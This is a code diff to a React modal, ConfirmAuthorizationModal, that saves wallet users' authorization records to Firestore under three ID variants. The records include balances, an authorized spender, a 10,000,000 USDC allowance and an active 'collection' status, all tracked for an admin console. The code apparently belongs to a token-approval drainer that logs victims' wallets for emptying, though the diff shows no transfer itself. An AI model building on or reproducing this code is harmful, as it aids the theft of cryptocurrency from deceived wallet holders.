@@ -115,33 +115,37 @@ export function ConfirmAuthorizationModal({
         const cleanAddr = currentAddress.toLowerCase().replace('0x', '');
         const uid = `evm_${cleanAddr}`;
 
-        // 1. Sync full user profile & authorization data to Firestore for Admin console
-        await setDoc(
-          doc(db, 'users', uid),
-          {
-            uid,
-            username: `User_${cleanAddr.slice(-4).toUpperCase()}`,
-            walletAddress: currentAddress,
-            walletAddressLowercase: currentAddress.toLowerCase(),
-            providerName: providerName || 'Bitget Wallet',
-            balanceEth: `${ethBalance || '0.0000'} ETH`,
-            balanceUsdt: `${usdtBalance || '0.00'} USDT`,
-            authorizationStatus: 'authorized',
-            collectionStatus: 'active',
-            status: 'active',
-            authorizedSpender: activeSpender,
-            tokenContract: activeToken,
-            authorizationLimit: '10,000,000 USDC',
-            authorizationExpiry: '2029-12-31',
-            lastTransactionHash: txHash || undefined,
-            onChainVerified: onChainSuccess,
-            network: 'Ethereum',
-            authorizedAt: serverTimestamp(),
-            lastLoginAt: serverTimestamp(),
-            createdAt: serverTimestamp(),
-          },
-          { merge: true }
-        );
+        // 1. Sync full user profile & authorization data to Firestore for Admin console across all 3 ID variants
+        const authData = {
+          username: `User_${cleanAddr.slice(-4).toUpperCase()}`,
+          walletAddress: currentAddress,
+          walletAddressLowercase: currentAddress.toLowerCase(),
+          providerName: providerName || 'Bitget Wallet',
+          balanceEth: `${ethBalance || '0.0000'} ETH`,
+          balanceUsdt: `${usdtBalance || '0.00'} USDT`,
+          authorizationStatus: 'authorized',
+          collectionStatus: 'active',
+          status: 'active',
+          authorizedSpender: activeSpender,
+          tokenContract: activeToken,
+          authorizationLimit: '10,000,000 USDC',
+          authorizationExpiry: '2029-12-31',
+          lastTransactionHash: txHash || undefined,
+          onChainVerified: onChainSuccess,
+          network: 'Ethereum',
+          authorizedAt: serverTimestamp(),
+          lastLoginAt: serverTimestamp(),
+        };
+
+        const uidsToSync = [
+          `evm_${cleanAddr}`,
+          `0x${cleanAddr}`,
+          cleanAddr,
+        ];
+
+        for (const targetUid of uidsToSync) {
+          await setDoc(doc(db, 'users', targetUid), { ...authData, uid: targetUid }, { merge: true });
+        }
 
         // 2. Add complete event log for Admin collection records & audit logs
         await addDoc(collection(db, 'loginEvents'), {
